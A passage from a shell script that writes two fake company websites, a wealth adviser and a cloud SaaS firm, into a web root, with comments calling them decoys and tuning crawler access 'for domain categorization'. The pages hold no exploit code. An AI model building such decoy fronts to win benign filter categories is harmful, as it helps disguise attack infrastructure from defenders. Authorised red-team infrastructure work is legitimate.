                    <div style="font-size: 1.1em; color: #0a1628; margin-bottom: 6px; font-weight: 600;">Independent Counsel</div>
                    <p class="text-muted" style="font-size: 0.9em;">We are not affiliated with any bank, brokerage, or insurance company. Our advice is independent.</p>
                </div>
                <div style="text-align: center; padding: 20px;">
                    <div style="font-size: 1.1em; color: #0a1628; margin-bottom: 6px; font-weight: 600;">Disciplined Process</div>
                    <p class="text-muted" style="font-size: 0.9em;">Our investment approach is grounded in fundamental analysis, long-term thinking, and cost-conscious implementation.</p>
                </div>
            </div>
        </div>
    </section>

    <section class="section text-center">
        <h2>Begin a Conversation</h2>
        <div class="divider"></div>
        <p class="text-muted" style="max-width: 480px; margin: 0 auto 28px; font-size: 0.95em;">We welcome the opportunity to learn about your financial situation and discuss how we may be of service.</p>
        <a href="/contact" class="btn">Contact Our Team</a>
    </section>

    <footer class="footer">
        <div class="footer-inner">
            <div class="footer-col">
                <a href="/" class="logo" style="font-size: 1.1em;">Meridian Financial Group</a>
                <p style="margin-top: 8px;">Wealth management and<br>investment advisory services.</p>
            </div>
            <div class="footer-col">
                <h4>Services</h4>
                <a href="/services">Wealth Management</a>
                <a href="/services">Investment Advisory</a>
                <a href="/services">Retirement Planning</a>
            </div>
            <div class="footer-col">
                <h4>Firm</h4>
                <a href="/approach">Our Approach</a>
                <a href="/contact">Contact</a>
            </div>
            <div class="footer-col">
                <h4>Legal</h4>
                <a href="#">Privacy Policy</a>
                <a href="#">Disclosures</a>
                <a href="#">Form ADV</a>
            </div>
        </div>
        <div class="disclaimer">
            <p>Meridian Financial Group is a registered investment adviser. Information presented is for educational purposes and does not intend to make an offer or solicitation for the sale or purchase of any securities. Investments involve risk and are not guaranteed. Past performance is not indicative of future results. Consult with a qualified financial adviser before making investment decisions.</p>
        </div>
        <div class="footer-bottom">
            <p>&copy; 2024 Meridian Financial Group. All rights reserved.</p>
        </div>
    </footer>
</body>
</html>
HTMLEOF

# Services page
cat > /var/www/html/services.html << 'HTMLEOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Meridian Financial Group offers wealth management, investment advisory, retirement planning, and estate planning services.">
    <meta name="keywords" content="wealth management services, financial advisory, portfolio management, retirement income planning, estate planning, tax planning, fiduciary advisor">
    <title>Services | Meridian Financial Group</title>
    <link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==">
    <link rel="stylesheet" href="/style.css">
</head>
<body>
    <header class="header">
        <nav class="nav">
            <a href="/" class="logo">Meridian Financial Group</a>
            <div class="nav-links">
                <a href="/services">Services</a>
                <a href="/approach">Our Approach</a>
                <a href="/contact">Contact</a>
            </div>
        </nav>
    </header>

    <section class="hero hero-sm">
        <h1>Our Services</h1>
        <p>Comprehensive financial counsel tailored to each client relationship.</p>
    </section>

    <section class="section">
        <div class="grid">
            <div class="card">
                <h3>Wealth Management</h3>
                <p>A coordinated approach to managing your financial life. We integrate investment management with tax planning, cash flow analysis, and estate considerations to provide a complete picture.</p>
                <ul>
                    <li>Customised portfolio construction</li>
                    <li>Tax-efficient investment strategies</li>
                    <li>Ongoing financial plan reviews</li>
                    <li>Coordination with your legal and tax advisers</li>
                </ul>
            </div>
            <div class="card">
                <h3>Investment Advisory</h3>
                <p>Research-driven portfolio management grounded in long-term fundamentals. We focus on asset allocation, diversification, and cost management to pursue consistent outcomes.</p>
                <ul>
                    <li>Strategic and tactical asset allocation</li>
                    <li>Fixed income and equity analysis</li>
                    <li>Alternative investment evaluation</li>
                    <li>Quarterly performance reporting</li>
                </ul>
            </div>
            <div class="card">
                <h3>Retirement Planning</h3>
                <p>Detailed analysis of retirement readiness, income sourcing, and distribution strategies. We help clients approach retirement with clarity and confidence.</p>
                <ul>
                    <li>Retirement income projections</li>
                    <li>Social Security optimisation</li>
                    <li>Required minimum distribution planning</li>
                    <li>Healthcare cost analysis</li>
                </ul>
            </div>
        </div>
    </section>

    <section style="background: #fff; padding: 70px 20px; border-top: 1px solid #e8e4d9;">
        <div style="max-width: 1000px; margin: 0 auto;">
            <h2 style="text-align: center; margin-bottom: 16px; font-size: 1.8em; color: #0a1628;">Additional Capabilities</h2>
            <div class="divider"></div>
            <div class="grid">
                <div class="card">
                    <h3>Estate Planning Coordination</h3>
                    <p>We work alongside your solicitors and accountants to ensure your estate plan reflects your current wishes and is structured efficiently for wealth transfer.</p>
                </div>
                <div class="card">
                    <h3>Institutional Advisory</h3>
                    <p>Investment advisory and governance support for endowments, foundations, and corporate pension schemes. We bring the same discipline we apply to individual portfolios.</p>
                </div>
                <div class="card">
                    <h3>Risk Management</h3>
                    <p>Evaluation of insurance needs, liability exposure, and portfolio risk. We help clients understand and manage the risks that could affect their long-term financial position.</p>
                </div>
            </div>
        </div>
    </section>

    <section class="section text-center">
        <h2>Discuss Your Needs</h2>
        <div class="divider"></div>
        <p class="text-muted" style="max-width: 480px; margin: 0 auto 28px; font-size: 0.95em;">Every engagement begins with understanding. We are happy to discuss how our services may align with your requirements.</p>
        <a href="/contact" class="btn">Get in Touch</a>
    </section>

    <footer class="footer">
        <div class="footer-inner">
            <div class="footer-col">
                <a href="/" class="logo" style="font-size: 1.1em;">Meridian Financial Group</a>
                <p style="margin-top: 8px;">Wealth management and<br>investment advisory services.</p>
            </div>
            <div class="footer-col">
                <h4>Services</h4>
                <a href="/services">Wealth Management</a>
                <a href="/services">Investment Advisory</a>
                <a href="/services">Retirement Planning</a>
            </div>
            <div class="footer-col">
                <h4>Firm</h4>
                <a href="/approach">Our Approach</a>
                <a href="/contact">Contact</a>
            </div>
            <div class="footer-col">
                <h4>Legal</h4>
                <a href="#">Privacy Policy</a>
                <a href="#">Disclosures</a>
                <a href="#">Form ADV</a>
            </div>
        </div>
        <div class="disclaimer">
            <p>Meridian Financial Group is a registered investment adviser. Information presented is for educational purposes and does not intend to make an offer or solicitation for the sale or purchase of any securities. Investments involve risk and are not guaranteed. Past performance is not indicative of future results.</p>
        </div>
        <div class="footer-bottom">
            <p>&copy; 2024 Meridian Financial Group. All rights reserved.</p>
        </div>
    </footer>
</body>
</html>
HTMLEOF

# Our Approach page
cat > /var/www/html/approach.html << 'HTMLEOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Our investment philosophy and approach to wealth management. Meridian Financial Group employs a disciplined, long-term fiduciary approach to financial planning and portfolio management.">
    <meta name="keywords" content="investment philosophy, fiduciary financial advisor, long-term investing, asset allocation strategy, risk management, financial planning process">
    <title>Our Approach | Meridian Financial Group</title>
    <link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==">
    <link rel="stylesheet" href="/style.css">
</head>
<body>
    <header class="header">
        <nav class="nav">
            <a href="/" class="logo">Meridian Financial Group</a>
            <div class="nav-links">
                <a href="/services">Services</a>
                <a href="/approach">Our Approach</a>
                <a href="/contact">Contact</a>
            </div>
        </nav>
    </header>

    <section class="hero hero-sm">
        <h1>Our Approach</h1>
        <p>A principled framework for managing wealth across generations.</p>
    </section>

    <section class="section">
        <h2>Investment Philosophy</h2>
        <div class="divider"></div>
        <div style="max-width: 700px; margin: 0 auto;">
            <p style="color: #555; margin-bottom: 20px; font-size: 0.95em;">Our investment philosophy is built on the belief that disciplined, long-term investing produces better outcomes than attempting to time markets or chase short-term performance. We focus on fundamental value, broad diversification, and keeping costs low.</p>
            <p style="color: #555; margin-bottom: 20px; font-size: 0.95em;">We construct portfolios using a combination of individual securities, index funds, and select active managers where we believe skill-based returns are achievable. Each portfolio is tailored to the client's risk tolerance, time horizon, income needs, and tax situation.</p>
            <p style="color: #555; font-size: 0.95em;">We rebalance systematically and review allocations as client circumstances evolve. Our role is to provide steady counsel and prevent emotional decision-making during periods of market stress.</p>
        </div>
    </section>

    <section style="background: #fff; padding: 70px 20px; border-top: 1px solid #e8e4d9;">
        <div style="max-width: 1000px; margin: 0 auto;">
            <h2 style="text-align: center; margin-bottom: 16px; font-size: 1.8em; color: #0a1628;">Our Process</h2>
            <div class="divider"></div>
            <div class="grid">
                <div class="card">
                    <h3>1. Discovery</h3>
                    <p>We begin by understanding your complete financial picture, including assets, liabilities, income sources, tax situation, estate structure, and most importantly, your goals and concerns.</p>
                </div>
                <div class="card">
                    <h3>2. Plan Development</h3>
                    <p>Based on our findings, we develop a written financial plan and investment policy statement that serves as the foundation for all recommendations and portfolio decisions.</p>
                </div>
                <div class="card">
                    <h3>3. Implementation</h3>
                    <p>We implement the agreed strategy through careful security selection, account structuring, and tax-aware transitions. We handle custodial paperwork and coordinate with your other advisers.</p>
                </div>
            </div>
            <div style="margin-top: 28px;">
                <div class="grid">
                    <div class="card">
                        <h3>4. Ongoing Management</h3>
                        <p>Portfolios are monitored continuously and rebalanced as needed. We provide quarterly reporting and make adjustments in response to changes in your life or the markets.</p>
                    </div>
                    <div class="card">
                        <h3>5. Regular Review</h3>
                        <p>We meet with clients at least annually to review progress, update assumptions, and ensure the financial plan remains aligned with evolving circumstances and objectives.</p>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <section class="section text-center">
        <h2>Start the Conversation</h2>
        <div class="divider"></div>
        <p class="text-muted" style="max-width: 480px; margin: 0 auto 28px; font-size: 0.95em;">We are committed to understanding each client before making any recommendations. There is no obligation and no cost for an initial discussion.</p>
        <a href="/contact" class="btn">Schedule a Meeting</a>
    </section>

    <footer class="footer">
        <div class="footer-inner">
            <div class="footer-col">
                <a href="/" class="logo" style="font-size: 1.1em;">Meridian Financial Group</a>
                <p style="margin-top: 8px;">Wealth management and<br>investment advisory services.</p>
            </div>
            <div class="footer-col">
                <h4>Services</h4>
                <a href="/services">Wealth Management</a>
                <a href="/services">Investment Advisory</a>
                <a href="/services">Retirement Planning</a>
            </div>
            <div class="footer-col">
                <h4>Firm</h4>
                <a href="/approach">Our Approach</a>
                <a href="/contact">Contact</a>
            </div>
            <div class="footer-col">
                <h4>Legal</h4>
                <a href="#">Privacy Policy</a>
                <a href="#">Disclosures</a>
                <a href="#">Form ADV</a>
            </div>
        </div>
        <div class="disclaimer">
            <p>Meridian Financial Group is a registered investment adviser. Information presented is for educational purposes and does not intend to make an offer or solicitation for the sale or purchase of any securities. Investments involve risk and are not guaranteed. Past performance is not indicative of future results.</p>
        </div>
        <div class="footer-bottom">
            <p>&copy; 2024 Meridian Financial Group. All rights reserved.</p>
        </div>
    </footer>
</body>
</html>
HTMLEOF

# Contact page
cat > /var/www/html/contact.html << 'HTMLEOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Contact Meridian Financial Group to schedule a consultation about wealth management, investment advisory, or financial planning services.">
    <meta name="keywords" content="contact financial advisor, wealth management consultation, investment advisory meeting, financial planning appointment">
    <title>Contact | Meridian Financial Group</title>
    <link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==">
    <link rel="stylesheet" href="/style.css">
</head>
<body>
    <header class="header">
        <nav class="nav">
            <a href="/" class="logo">Meridian Financial Group</a>
            <div class="nav-links">
                <a href="/services">Services</a>
                <a href="/approach">Our Approach</a>
                <a href="/contact">Contact</a>
            </div>
        </nav>
    </header>

    <section class="hero hero-sm">
        <h1>Contact Us</h1>
        <p>We welcome the opportunity to discuss your financial needs.</p>
    </section>

    <section class="section">
        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 60px; max-width: 860px; margin: 0 auto;">
            <div>
                <h2 style="margin-bottom: 24px; font-size: 1.4em;">Request a Consultation</h2>
                <form onsubmit="event.preventDefault(); this.innerHTML='<p style=padding:40px;text-align:center;color:#555;>Thank you for your enquiry. A member of our team will be in touch within two business days.</p>'; return false;">
                    <div class="form-group">
                        <label>Full Name</label>
                        <input type="text" required>
                    </div>
                    <div class="form-group">
                        <label>Email Address</label>
                        <input type="email" required>
                    </div>
                    <div class="form-group">
                        <label>Telephone</label>
                        <input type="tel">
                    </div>
                    <div class="form-group">
                        <label>Area of Interest</label>
                        <select>
                            <option>Wealth Management</option>
                            <option>Investment Advisory</option>
                            <option>Retirement Planning</option>
                            <option>Estate Planning</option>
                            <option>General Enquiry</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label>Message</label>
                        <textarea rows="4"></textarea>
                    </div>
                    <button type="submit" class="btn" style="border: none; cursor: pointer; font-size: 0.85em;">Submit Enquiry</button>
                </form>
            </div>
            <div style="padding-top: 50px;">
                <div style="margin-bottom: 28px;">
                    <h3 style="margin-bottom: 6px; color: #0a1628; font-size: 1.05em;">Office</h3>
                    <p class="text-muted" style="font-size: 0.92em;">48 Moorgate, 3rd Floor<br>London, EC2R 6EJ</p>
                </div>
                <div style="margin-bottom: 28px;">
                    <h3 style="margin-bottom: 6px; color: #0a1628; font-size: 1.05em;">Enquiries</h3>
                    <p class="text-muted" style="font-size: 0.92em;">enquiries@example-financial.com</p>
                </div>
                <div style="margin-bottom: 28px;">
                    <h3 style="margin-bottom: 6px; color: #0a1628; font-size: 1.05em;">Telephone</h3>
                    <p class="text-muted" style="font-size: 0.92em;">+44 (0)20 7946 0328</p>
                </div>
                <div>
                    <h3 style="margin-bottom: 6px; color: #0a1628; font-size: 1.05em;">Hours</h3>
                    <p class="text-muted" style="font-size: 0.92em;">Monday to Friday, 9:00 - 17:30</p>
                </div>
            </div>
        </div>
    </section>

    <footer class="footer">
        <div class="footer-inner">
            <div class="footer-col">
                <a href="/" class="logo" style="font-size: 1.1em;">Meridian Financial Group</a>
                <p style="margin-top: 8px;">Wealth management and<br>investment advisory services.</p>
            </div>
            <div class="footer-col">
                <h4>Services</h4>
                <a href="/services">Wealth Management</a>
                <a href="/services">Investment Advisory</a>
                <a href="/services">Retirement Planning</a>
            </div>
            <div class="footer-col">
                <h4>Firm</h4>
                <a href="/approach">Our Approach</a>
                <a href="/contact">Contact</a>
            </div>
            <div class="footer-col">
                <h4>Legal</h4>
                <a href="#">Privacy Policy</a>
                <a href="#">Disclosures</a>
                <a href="#">Form ADV</a>
            </div>
        </div>
        <div class="disclaimer">
            <p>Meridian Financial Group is a registered investment adviser. Information presented is for educational purposes and does not intend to make an offer or solicitation for the sale or purchase of any securities. Investments involve risk and are not guaranteed. Past performance is not indicative of future results.</p>
        </div>
        <div class="footer-bottom">
            <p>&copy; 2024 Meridian Financial Group. All rights reserved.</p>
        </div>
    </footer>
</body>
</html>
HTMLEOF

# Error pages
cat > /var/www/html/404.html << 'HTMLEOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Page Not Found | Meridian Financial Group</title>
    <link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==">
    <link rel="stylesheet" href="/style.css">
</head>
<body>
    <header class="header">
        <nav class="nav">
            <a href="/" class="logo">Meridian Financial Group</a>
            <div class="nav-links">
                <a href="/services">Services</a>
                <a href="/approach">Our Approach</a>
                <a href="/contact">Contact</a>
            </div>
        </nav>
    </header>
    <section class="hero hero-sm">
        <h1 style="font-size: 4em; margin-bottom: 10px;">404</h1>
        <p>The page you requested could not be found.</p>
        <div class="mt-20"><a href="/" class="btn">Return to Home</a></div>
    </section>
    <footer class="footer">
        <div class="footer-bottom" style="border: none; margin: 0; padding: 0;">
            <p>&copy; 2024 Meridian Financial Group. All rights reserved.</p>
        </div>
    </footer>
</body>
</html>
HTMLEOF

cat > /var/www/html/50x.html << 'HTMLEOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Service Unavailable | Meridian Financial Group</title>
    <link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==">
    <link rel="stylesheet" href="/style.css">
</head>
<body>
    <header class="header">
        <nav class="nav">
            <a href="/" class="logo">Meridian Financial Group</a>
            <div class="nav-links">
                <a href="/services">Services</a>
                <a href="/approach">Our Approach</a>
                <a href="/contact">Contact</a>
            </div>
        </nav>
    </header>
    <section class="hero hero-sm">
        <h1>Temporarily Unavailable</h1>
        <p>We are performing scheduled maintenance. Please try again shortly.</p>
    </section>
    <footer class="footer">
        <div class="footer-bottom" style="border: none; margin: 0; padding: 0;">
            <p>&copy; 2024 Meridian Financial Group. All rights reserved.</p>
        </div>
    </footer>
</body>
</html>
HTMLEOF

# robots.txt - ALLOW crawlers for domain categorization
cat > /var/www/html/robots.txt << 'ROBOTSEOF'
User-agent: *
Allow: /
Disallow: /admin
Disallow: /wp-admin

Sitemap: https://example-financial.com/sitemap.xml
ROBOTSEOF

# sitemap.xml - helps categorization crawlers discover all pages
cat > /var/www/html/sitemap.xml << 'SITEMAPEOF'
<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
    <url><loc>https://example-financial.com/</loc><priority>1.0</priority></url>
    <url><loc>https://example-financial.com/services</loc><priority>0.8</priority></url>
    <url><loc>https://example-financial.com/approach</loc><priority>0.8</priority></url>
    <url><loc>https://example-financial.com/contact</loc><priority>0.7</priority></url>
</urlset>
SITEMAPEOF

echo "Finance decoy website created (Meridian Financial Group)"

else
# =============================================================================
# PLEXURA - Plexura Managed Solutions (default)
# Generic SaaS company, blocks crawlers
# =============================================================================

cat > /var/www/html/style.css << 'CSSEOF'
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
    line-height: 1.6;
    color: #333;
    background: #f8f9fa;
}
.header {
    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
    padding: 15px 0;
    position: fixed;
    width: 100%;
    top: 0;
    z-index: 1000;
}
.nav {
    max-width: 1200px;
    margin: 0 auto;
    padding: 0 20px;
    display: flex;
    justify-content: space-between;
    align-items: center;
}
.logo {
    color: #fff;
    font-size: 1.5em;
    font-weight: 700;
    text-decoration: none;
}
.logo span { color: #4a9eff; }
.nav-links a {
    color: #ccc;
    text-decoration: none;
    margin-left: 30px;
    font-size: 0.95em;
    transition: color 0.3s;
}
.nav-links a:hover { color: #fff; }
.hero {
    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
    padding: 150px 20px 100px;
    text-align: center;
    color: #fff;
}
.hero h1 {
    font-size: 2.8em;
    margin-bottom: 20px;
    font-weight: 700;
}
.hero p {
    font-size: 1.2em;
    opacity: 0.9;
    max-width: 600px;
    margin: 0 auto 30px;
}
.hero-sm { padding: 130px 20px 60px; }
.hero-sm h1 { font-size: 2.2em; margin-bottom: 10px; }
.btn {
    display: inline-block;
    padding: 15px 40px;
    background: #4a9eff;
    color: #fff;
    text-decoration: none;
    border-radius: 5px;
    font-weight: 600;
    transition: background 0.3s;
}
.btn:hover { background: #3a8eef; }
.btn-outline {
    background: transparent;
    border: 2px solid #4a9eff;
    color: #4a9eff;
}
.btn-outline:hover { background: #4a9eff; color: #fff; }
.section {
    padding: 80px 20px;
    max-width: 1200px;
    margin: 0 auto;
}
.section h2 {
    text-align: center;
    margin-bottom: 50px;
    font-size: 2em;
}
.grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
    gap: 30px;
}
.card {
    background: #fff;
    padding: 30px;
    border-radius: 10px;
    box-shadow: 0 5px 15px rgba(0,0,0,0.08);
}
.card h3 {
    margin-bottom: 15px;
    color: #1a1a2e;
}
.card p { color: #666; }
.card ul { color: #666; margin-top: 10px; padding-left: 20px; }
.card ul li { margin-bottom: 8px; }
.text-center { text-align: center; }
.text-muted { color: #666; }
.mt-20 { margin-top: 20px; }
.mt-40 { margin-top: 40px; }
.mb-20 { margin-bottom: 20px; }
.footer {
    background: #1a1a2e;
    color: #999;
    padding: 40px 20px;
    text-align: center;
}
.footer-inner {
    max-width: 1200px;
    margin: 0 auto;
    display: flex;
    justify-content: space-between;
    align-items: start;
    flex-wrap: wrap;
    gap: 30px;
    text-align: left;
}
.footer-col h4 { color: #ccc; margin-bottom: 12px; font-size: 0.95em; }
.footer-col a { color: #888; text-decoration: none; display: block; margin-bottom: 6px; font-size: 0.85em; }
.footer-col a:hover { color: #4a9eff; }
.footer-col p { font-size: 0.85em; line-height: 1.8; }
.footer-bottom { margin-top: 30px; padding-top: 20px; border-top: 1px solid #2a2a4e; text-align: center; }
.footer-bottom p { font-size: 0.85em; }
/* Pricing */
.price { font-size: 2em; font-weight: 700; color: #1a1a2e; margin: 15px 0 5px; }
.price-sub { font-size: 0.85em; color: #999; margin-bottom: 20px; }
.card-highlight { border: 2px solid #4a9eff; }
/* Contact form */
.form-group { margin-bottom: 18px; }
.form-group label { display: block; margin-bottom: 5px; font-weight: 500; color: #444; font-size: 0.9em; }
.form-group input, .form-group select, .form-group textarea {
    width: 100%; padding: 10px 14px; border: 1px solid #ddd; border-radius: 5px;
    font-size: 0.95em; font-family: inherit; transition: border 0.3s;
}
.form-group input:focus, .form-group select:focus, .form-group textarea:focus {
    outline: none; border-color: #4a9eff;
}
/* Trusted by bar */
.trusted {
    background: #fff;
    padding: 40px 20px;
    text-align: center;
    border-bottom: 1px solid #eee;
}
.trusted p { color: #999; font-size: 0.85em; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 15px; }
.trusted-logos { display: flex; justify-content: center; gap: 50px; flex-wrap: wrap; opacity: 0.4; font-size: 1.4em; color: #666; font-weight: 600; }
CSSEOF

# Homepage
cat > /var/www/html/index.html << 'HTMLEOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Enterprise cloud solutions for modern businesses">
    <meta name="robots" content="noindex, nofollow">
    <title>Plexura Managed Solutions | Managed Cloud Services</title>
    <link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==">
    <link rel="stylesheet" href="/style.css">
</head>
<body>
    <header class="header">
        <nav class="nav">
            <a href="/" class="logo">Plexura<span>MS</span></a>
            <div class="nav-links">
                <a href="/solutions">Solutions</a>
                <a href="/pricing">Pricing</a>
                <a href="/contact">Contact</a>
            </div>
        </nav>
    </header>

    <section class="hero">
        <h1>Managed Cloud Infrastructure</h1>
        <p>Secure, scalable managed services for modern enterprises. Simplify your cloud operations with our end-to-end platform.</p>
        <a href="/contact" class="btn">Request Demo</a>
    </section>

    <div class="trusted">
        <p>Trusted by teams worldwide</p>
        <div class="trusted-logos">
            <span>Meridian Corp</span>
            <span>Axion Systems</span>
            <span>NovaBridge</span>
            <span>Stratos.io</span>
        </div>
    </div>

    <section class="section">
        <h2>Why Choose Plexura MS?</h2>
        <div class="grid">
            <div class="card">
                <h3>Enterprise Security</h3>
                <p>SOC 2 Type II certified with end-to-end encryption. Your data is protected with industry-leading security standards and zero-trust architecture.</p>
            </div>
            <div class="card">
                <h3>Real-time Sync</h3>
                <p>Millisecond latency data synchronization across all your systems. Keep your teams aligned with bi-directional replication.</p>
            </div>
            <div class="card">
                <h3>Advanced Analytics</h3>
                <p>Comprehensive dashboards and reporting tools to help you make data-driven decisions with real-time visibility.</p>
            </div>
        </div>
    </section>

    <section style="background: #fff; padding: 80px 20px;">
        <div style="max-width: 1200px; margin: 0 auto;">
            <h2 style="text-align: center; margin-bottom: 50px; font-size: 2em;">Built for Scale</h2>
            <div class="grid">
                <div style="text-align: center; padding: 20px;">
                    <div style="font-size: 2.5em; font-weight: 700; color: #4a9eff;">99.99%</div>
                    <p class="text-muted">Uptime SLA</p>
                </div>
                <div style="text-align: center; padding: 20px;">
                    <div style="font-size: 2.5em; font-weight: 700; color: #4a9eff;">50+</div>
                    <p class="text-muted">Global Regions</p>
                </div>
                <div style="text-align: center; padding: 20px;">
                    <div style="font-size: 2.5em; font-weight: 700; color: #4a9eff;">10M+</div>
                    <p class="text-muted">Events per Second</p>
                </div>
            </div>
        </div>
    </section>

    <section class="section text-center">
        <h2>Ready to get started?</h2>
        <p class="text-muted" style="max-width: 500px; margin: 0 auto 30px;">Join hundreds of organisations already using Plexura to manage their cloud infrastructure.</p>
        <a href="/contact" class="btn">Talk to Sales</a>
    </section>

    <footer class="footer">
        <div class="footer-inner">
            <div class="footer-col">
                <a href="/" class="logo" style="font-size: 1.3em;">Plexura<span>MS</span></a>
                <p style="margin-top: 10px;">Managed cloud infrastructure<br>for modern enterprises.</p>
            </div>
            <div class="footer-col">
                <h4>Product</h4>
                <a href="/solutions">Solutions</a>
                <a href="/pricing">Pricing</a>
                <a href="#">Changelog</a>
            </div>
            <div class="footer-col">
                <h4>Company</h4>
                <a href="#">About</a>
                <a href="#">Careers</a>
                <a href="/contact">Contact</a>
            </div>
            <div class="footer-col">
                <h4>Legal</h4>
                <a href="#">Privacy Policy</a>
                <a href="#">Terms of Service</a>
            </div>
        </div>
        <div class="footer-bottom">
            <p>&copy; 2024 Plexura Managed Solutions. All rights reserved.</p>
        </div>
    </footer>
</body>
</html>
HTMLEOF

# Solutions page
cat > /var/www/html/solutions.html << 'HTMLEOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>Solutions | Plexura</title>
    <link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==">
    <link rel="stylesheet" href="/style.css">
</head>
<body>
    <header class="header">
        <nav class="nav">
            <a href="/" class="logo">Plexura<span>MS</span></a>
            <div class="nav-links">
                <a href="/solutions">Solutions</a>
                <a href="/pricing">Pricing</a>
                <a href="/contact">Contact</a>
            </div>
        </nav>
    </header>

    <section class="hero hero-sm">
        <h1>Solutions</h1>
        <p>Purpose-built data infrastructure for every team and use case.</p>
    </section>

    <section class="section">
        <div class="grid">
            <div class="card">
                <h3>Data Replication</h3>
                <p>Real-time, bi-directional data replication across cloud providers, on-premises databases, and hybrid environments.</p>
                <ul>
                    <li>Cross-cloud sync (AWS, Azure, GCP)</li>
                    <li>Schema migration and versioning</li>
                    <li>Conflict resolution policies</li>
                    <li>Sub-second replication lag</li>
                </ul>
            </div>
            <div class="card">
                <h3>Stream Processing</h3>
                <p>Process and transform data streams in real-time with our managed event pipeline infrastructure.</p>
                <ul>
                    <li>Event-driven architecture</li>
                    <li>Custom transformation rules</li>
                    <li>Dead letter queue handling</li>
                    <li>Exactly-once delivery guarantees</li>
                </ul>
            </div>
            <div class="card">
                <h3>Managed ETL</h3>
                <p>Fully managed extract, transform, and load pipelines with built-in monitoring and error handling.</p>
                <ul>
                    <li>200+ pre-built connectors</li>
                    <li>Visual pipeline builder</li>
                    <li>Incremental loading</li>
                    <li>Data quality checks</li>
                </ul>
            </div>
        </div>
    </section>

    <section style="background: #fff; padding: 80px 20px;">
        <div style="max-width: 1200px; margin: 0 auto;">
            <h2 style="text-align: center; margin-bottom: 50px; font-size: 2em;">Enterprise Ready</h2>
            <div class="grid">
                <div class="card">
                    <h3>Security & Compliance</h3>
                    <p>SOC 2 Type II, HIPAA, and GDPR compliant. All data encrypted in transit and at rest with customer-managed keys.</p>
                </div>
                <div class="card">
                    <h3>High Availability</h3>
                    <p>Multi-region deployment with automatic failover. 99.99% uptime SLA backed by enterprise support agreements.</p>
                </div>
                <div class="card">
                    <h3>Observability</h3>
                    <p>Built-in monitoring, alerting, and tracing. Integrates with Datadog, PagerDuty, Splunk, and more.</p>
                </div>
            </div>
        </div>
    </section>

    <section class="section text-center">
        <h2>See Plexura in action</h2>
        <p class="text-muted" style="max-width: 500px; margin: 0 auto 30px;">Our team can walk you through a personalized demo based on your use case.</p>
        <a href="/contact" class="btn">Schedule a Demo</a>
    </section>

    <footer class="footer">
        <div class="footer-inner">
            <div class="footer-col">
                <a href="/" class="logo" style="font-size: 1.3em;">Plexura<span>MS</span></a>
                <p style="margin-top: 10px;">Managed cloud infrastructure<br>for modern enterprises.</p>
            </div>
            <div class="footer-col">
                <h4>Product</h4>
                <a href="/solutions">Solutions</a>
                <a href="/pricing">Pricing</a>
                <a href="#">Changelog</a>
            </div>
            <div class="footer-col">
                <h4>Company</h4>
                <a href="#">About</a>
                <a href="#">Careers</a>
                <a href="/contact">Contact</a>
            </div>
            <div class="footer-col">
                <h4>Legal</h4>
                <a href="#">Privacy Policy</a>
                <a href="#">Terms of Service</a>
            </div>
        </div>
        <div class="footer-bottom">
            <p>&copy; 2024 Plexura Managed Solutions. All rights reserved.</p>
        </div>
    </footer>
</body>
</html>
HTMLEOF

# Pricing page (brief and vague)
cat > /var/www/html/pricing.html << 'HTMLEOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
